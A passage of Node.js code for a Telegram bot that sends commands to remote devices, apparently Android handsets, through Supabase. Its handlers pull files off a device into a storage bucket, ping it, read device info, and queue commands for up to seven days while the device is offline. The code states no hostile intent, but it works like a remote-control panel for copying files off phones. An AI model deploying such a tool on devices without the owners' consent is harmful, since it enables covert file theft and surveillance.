  await bot.sendMessage(chatId, "📦 Preparing upload...");
  try {
    const prepCmd = await sendCommand(deviceId, "prepare_upload", { path });
    const timeout = online ? 90_000 : SEVEN_DAYS_MS;
    if (!online) await bot.sendMessage(chatId, `⚠️ Device offline — upload queued. Waiting...`);

    const prepRes = await waitForResultRealtime(prepCmd.id, timeout);
    const prepPayload = unwrapResult(prepRes);
    if (!prepPayload || !prepPayload.success) {
      bot.sendMessage(chatId, `❌ Prepare failed: ${JSON.stringify(prepPayload)}`);
      return;
    }

    const source = {
      is_content_uri: !!prepPayload.is_content_uri,
      uri: prepPayload.uri || null,
      file_path: prepPayload.path || path,
      meta: prepPayload,
    };

    const destName = (prepPayload.name || path.split("/").pop() || "file").replace(/\s+/g, "_");
    const payload = {
      device_id: deviceId,
      bucket: "device-uploads",
      dest: `${deviceId}/${Date.now()}_${destName}`,
      source,
    };

    await bot.sendMessage(chatId, "☁️ Uploading to storage...");
    const { data, error } = await supabase.functions.invoke("upload-file", { body: payload });

    if (error) {
      bot.sendMessage(chatId, `❌ Upload failed: ${error.message || JSON.stringify(error)}`);
      return;
    }
    if (data && data.error) {
      bot.sendMessage(chatId, `❌ Upload failed (function): ${data.error}`);
      return;
    }

    const size = data.size ? formatBytes(data.size) : "unknown";
    bot.sendMessage(chatId, `✅ Uploaded\n📁 Bucket: ${data.bucket}\n📄 Path: ${data.path}\n📊 Size: ${size}`);
  } catch (e) {
    console.error("upload error:", e);
    bot.sendMessage(chatId, `❌ upload error: ${e.message || e}`);
  }
});

// /ping
bot.onText(/^\/ping$/i, async (msg) => {
  const sel = await getSelectedDevice(msg.chat.id);
  if (!sel) return;
  const { deviceId, online } = sel;
  try {
    const cmd = await sendCommand(deviceId, "ping");
    const timeout = online ? 20_000 : SEVEN_DAYS_MS;
    if (!online) await bot.sendMessage(msg.chat.id, `⚠️ Device offline — ping queued. Waiting...`);

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};
    const ts = payload.timestamp || payload.ts || Date.now();
    bot.sendMessage(msg.chat.id, `🏓 Pong\n⏱️ ${ts}`);
  } catch (e) {
    console.error("ping error:", e);
    bot.sendMessage(msg.chat.id, `❌ Ping failed: ${e.message || e}`);
  }
});

// /info
bot.onText(/^\/info$/i, async (msg) => {
  const sel = await getSelectedDevice(msg.chat.id);
  if (!sel) return;

  const { deviceId, online } = sel;

  try {
    const cmd = await sendCommand(deviceId, "device_info");
    const timeout = online ? 20_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(
        msg.chat.id,
        "⚠️ Device offline — info command queued. Waiting..."
      );
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    const st = chatState.get(msg.chat.id);
    if (payload.cwd && st) st.cwd = payload.cwd;

    const text = formatInfo(payload, deviceId) || "No info.";
    for (const chunk of chunkMessage(text)) {
      await bot.sendMessage(msg.chat.id, chunk);
    }
  } catch (e) {
    bot.sendMessage(
      msg.chat.id,
      `❌ info failed: ${e.message || e}`
    );
  }
});

/* ===========================
   Webhook server + health
   =========================== */

async function ensureWebhook() {
  try {
    const hook = `${WEBHOOK_URL.replace(/\/$/, "")}/bot${BOT_TOKEN}`;
    await bot.setWebHook(hook);
    console.log("✅ Webhook set:", hook);
  } catch (err) {
    console.error("❌ Failed to set webhook:", err?.response?.body || err?.message || err);
    if (err?.response?.statusCode === 409) {
      console.error("⚠️ Conflict (409) - ensure no other bot instance is running.");
    }
  }
}

await ensureWebhook();

const server = http.createServer(async (req, res) => {
  try {
    if (req.method === "POST" && req.url === `/bot${BOT_TOKEN}`) {
      let body = "";
      req.on("data", chunk => (body += chunk));
      req.on("end", async () => {
        try {
          if (!body) { res.writeHead(400); res.end("no body"); return; }
          const json = JSON.parse(body);
          await bot.processUpdate(json);
          res.writeHead(200); res.end("ok");
        } catch (e) {
          console.error("processUpdate error:", e);
          res.writeHead(500); res.end("error");
        }
      });
      return;
    }

    if (req.method === "GET" && req.url === "/") {
      const connectedChats = chatState.size;
      const activeSubs = pendingSubs.size;
      const u = { 
        ok: true, 
        uptime: process.uptime(), 
        connectedChats, 
        activePendingCommands: activeSubs, 
        timestamp: new Date().toISOString() 
      };
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(u));
      return;
    }

    res.writeHead(404); res.end("not found");
  } catch (e) {
    console.error("server error:", e);
    res.writeHead(500); res.end("fatal");
  }
});

server.listen(PORT, () => {
  console.log(`🚀 Webhook server listening on port ${PORT}`);
  console.log(`📡 Webhook endpoint: POST ${WEBHOOK_URL.replace(/\/$/, "")}/bot${BOT_TOKEN}`);
});

/* housekeeping */
bot.on("polling_error", (err) => {
  console.warn("⚠️ polling_error:", err?.message || err);
});

process.on("unhandledRejection", (e) => {
  console.error("❌ Unhandled promise:", e);
});

process.on("uncaughtException", (e) => {
  console.error("❌ Uncaught exception:", e);
  process.exit(1);
});
